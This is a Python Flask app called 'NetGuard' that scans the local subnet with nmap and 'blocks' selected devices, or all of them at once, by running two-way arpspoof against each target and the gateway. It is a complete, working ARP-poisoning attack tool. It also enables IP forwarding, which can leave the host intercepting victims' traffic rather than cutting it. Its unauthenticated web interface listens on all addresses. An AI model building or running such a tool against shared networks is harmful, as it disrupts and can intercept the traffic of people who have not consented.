#!/usr/bin/env python3
"""NetGuard — Network Device Blocker GUI"""

import subprocess
import re
import os
import signal
import sys
import ipaddress
from flask import Flask, render_template, jsonify, request

app = Flask(__name__)

# Store blocked devices: {ip: {"mac": "xx:xx", "pids": [pid1, pid2]}}
blocked = {}

# Gateway captured once at startup from the device's routing table
GATEWAY = None

# Common gateway addresses tried (in order) when the routing table has none
GATEWAY_CANDIDATES = ["172.16.8.1", "192.168.1.1"]


def get_interface():
    """Get the active wlan interface"""
    try:
        result = subprocess.run(["ip", "route"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "default" in line and "wlan" in line:
                return line.split()[4]
    except Exception:
        pass
    # Fallback
    return "wlan0"


def get_subnet():
    """Get subnet from wlan0 IP address"""
    iface = get_interface()
    try:
        result = subprocess.run(
            ["ip", "addr", "show", iface], capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                ip_parts = line.split()[1]  # e.g. 192.168.1.3/27
                net = ipaddress.ip_network(ip_parts, strict=False)
                return str(net)
    except Exception:
        pass
    return "192.168.1.0/24"


def detect_gateway():
    """Get the default gateway IP set on this device, or None"""
    try:
        result = subprocess.run(["ip", "route"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "default" in line:
                return line.split()[2]
    except Exception:
        pass
    return None


def get_local_networks():
    """Get all IPv4 networks configured on this device (loopback excluded)"""
    networks = []
    try:
        result = subprocess.run(["ip", "-4", "addr"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet ") and not line.startswith("inet 127."):
                networks.append(ipaddress.ip_network(line.split()[1], strict=False))
    except Exception:
        pass
    return networks


def pick_fallback_gateway():
    """Pick the first common gateway candidate inside this device's subnet"""
    networks = get_local_networks()
    for candidate in GATEWAY_CANDIDATES:
        addr = ipaddress.ip_address(candidate)
        for net in networks:
            if addr in net:
                return candidate
    return None


def get_gateway():
    """Return the gateway captured at application startup"""
    return GATEWAY


def get_own_ip():
    """Get own IP address"""
    iface = get_interface()
    try:
        result = subprocess.run(
            ["ip", "addr", "show", iface], capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return None


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/scan")
def scan_network():
    """Scan network using nmap and return device list"""
    subnet = get_subnet()
    own_ip = get_own_ip()
    gateway = get_gateway()
    iface = get_interface()

    try:
        result = subprocess.run(
            ["nmap", "-sn", "-n", subnet], capture_output=True, text=True, timeout=30
        )
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Scan timeout"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    devices = []
    lines = result.stdout.splitlines()
    i = 0
    while i < len(lines):
        line = lines[i]
        # Match: "Nmap scan report for 192.168.1.10"
        m = re.search(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)", line)
        if m:
            ip = m.group(1)
            mac = ""
            vendor = ""
            # Look ahead for MAC address line
            if i + 1 < len(lines):
                mac_match = re.search(
                    r"MAC Address: ([0-9A-Fa-f:]{17}) ?\(?([^)]*)\)?", lines[i + 1]
                )
                if mac_match:
                    mac = mac_match.group(1)
                    vendor = mac_match.group(2).strip()

            # If no MAC (own device), try ARP table
            if not mac:
                try:
                    arp_result = subprocess.run(
                        ["cat", "/proc/net/arp"], capture_output=True, text=True
                    )
                    for arp_line in arp_result.stdout.splitlines()[1:]:
                        parts = arp_line.split()
                        if len(parts) >= 4 and parts[0] == ip:
                            mac = parts[3]
                            break
                except Exception:
                    pass

            is_self = ip == own_ip
            is_gateway = ip == gateway
            is_blocked = ip in blocked

            if is_gateway:
                dev_type = "Router"
            elif is_self:
                dev_type = "This Device"
            else:
                dev_type = "Device"

            devices.append(
                {
                    "ip": ip,
                    "mac": mac or "Unknown",
                    "vendor": vendor or "Unknown",
                    "type": dev_type,
                    "self": is_self,
                    "gateway": is_gateway,
                    "blocked": is_blocked,
                }
            )
        i += 1

    return jsonify(
        {
            "devices": devices,
            "gateway": gateway,
            "interface": iface,
            "subnet": subnet,
            "own_ip": own_ip,
        }
    )


@app.route("/api/block", methods=["POST"])
def block_device():
    """Block a device using ARP spoofing"""
    data = request.json
    ip = data.get("ip")
    mac = data.get("mac", "")

    if not ip:
        return jsonify({"error": "IP required"}), 400

    if ip in blocked:
        return jsonify({"error": "Already blocked"}), 400

    iface = get_interface()
    gateway = get_gateway()

    # Enable IP forwarding to avoid cutting our own connection
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception:
        pass

    pids = []
    try:
        # Spoof target -> gateway
        p1 = subprocess.Popen(
            ["arpspoof", "-i", iface, "-t", ip, gateway],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        pids.append(p1.pid)

        # Spoof gateway -> target
        p2 = subprocess.Popen(
            ["arpspoof", "-i", iface, "-t", gateway, ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        pids.append(p2.pid)

        blocked[ip] = {"mac": mac, "pids": pids}
        return jsonify({"success": True, "ip": ip, "pids": pids})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/unblock", methods=["POST"])
def unblock_device():
    """Unblock a device by killing arpspoof processes"""
    data = request.json
    ip = data.get("ip")

    if not ip:
        return jsonify({"error": "IP required"}), 400

    if ip not in blocked:
        return jsonify({"error": "Not blocked"}), 400

    pids = blocked[ip]["pids"]
    for pid in pids:
        try:
            os.kill(pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
        except Exception:
            pass

    del blocked[ip]
    return jsonify({"success": True, "ip": ip})


@app.route("/api/block_all", methods=["POST"])
def block_all():
    """Block all devices except self and gateway"""
    subnet = get_subnet()
    own_ip = get_own_ip()
    gateway = get_gateway()
    iface = get_interface()

    try:
        result = subprocess.run(
            ["nmap", "-sn", "-n", subnet], capture_output=True, text=True, timeout=30
        )
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    # Parse devices
    targets = []
    lines = result.stdout.splitlines()
    i = 0
    while i < len(lines):
        m = re.search(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)", lines[i])
        if m:
            ip = m.group(1)
            if ip == own_ip or ip == gateway:
                i += 1
                continue
            mac = ""
            if i + 1 < len(lines):
                mac_match = re.search(
                    r"MAC Address: ([0-9A-Fa-f:]{17})", lines[i + 1]
                )
                if mac_match:
                    mac = mac_match.group(1)
            if not mac:
                try:
                    arp_result = subprocess.run(
                        ["cat", "/proc/net/arp"], capture_output=True, text=True
                    )
                    for arp_line in arp_result.stdout.splitlines()[1:]:
                        parts = arp_line.split()
                        if len(parts) >= 4 and parts[0] == ip:
                            mac = parts[3]
                            break
                except Exception:
                    pass
            targets.append({"ip": ip, "mac": mac})
        i += 1

    # Enable IP forwarding
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception:
        pass

    results = []
    for t in targets:
        ip = t["ip"]
        if ip in blocked:
            results.append({"ip": ip, "status": "already_blocked"})
            continue
        pids = []
        try:
            p1 = subprocess.Popen(
                ["arpspoof", "-i", iface, "-t", ip, gateway],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            pids.append(p1.pid)
            p2 = subprocess.Popen(
                ["arpspoof", "-i", iface, "-t", gateway, ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            pids.append(p2.pid)
            blocked[ip] = {"mac": t["mac"], "pids": pids}
            results.append({"ip": ip, "status": "blocked"})
        except Exception as e:
            results.append({"ip": ip, "status": "error", "error": str(e)})

    return jsonify({"success": True, "results": results})


@app.route("/api/unblock_all", methods=["POST"])
def unblock_all():
    """Unblock all devices"""
    results = []
    for ip in list(blocked.keys()):
        pids = blocked[ip]["pids"]
        for pid in pids:
            try:
                os.kill(pid, signal.SIGTERM)
            except Exception:
                pass
        results.append(ip)
        del blocked[ip]
    return jsonify({"success": True, "unblocked": results})


@app.route("/api/status")
def status():
    """Return list of currently blocked devices"""
    # Verify processes are still alive
    alive = {}
    for ip, info in blocked.items():
        live_pids = []
        for pid in info["pids"]:
            try:
                os.kill(pid, 0)  # Check if process exists
                live_pids.append(pid)
            except OSError:
                pass
        if live_pids:
            alive[ip] = {"mac": info["mac"], "pids": live_pids}
    # Update blocked dict
    blocked.clear()
    blocked.update(alive)
    return jsonify({"blocked": list(blocked.keys()), "details": blocked})


if __name__ == "__main__":
    print("NetGuard starting...")

    # Capture the device gateway first: routing table, then subnet-matched fallback
    gateway = detect_gateway()
    source = "ip route"
    if not gateway:
        gateway = pick_fallback_gateway()
        source = "subnet fallback"
    if not gateway:
        print("ERROR: no gateway detected on this device (tried ip route, then common defaults).")
        print("Connect to a network first (check with: ip route), then run NetGuard again.")
        sys.exit(1)
    GATEWAY = gateway

    print(f"Gateway: {GATEWAY} ({source})")
    print(f"Interface: {get_interface()}")
    print(f"Subnet: {get_subnet()}")
    print("Access: http://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000, debug=False)
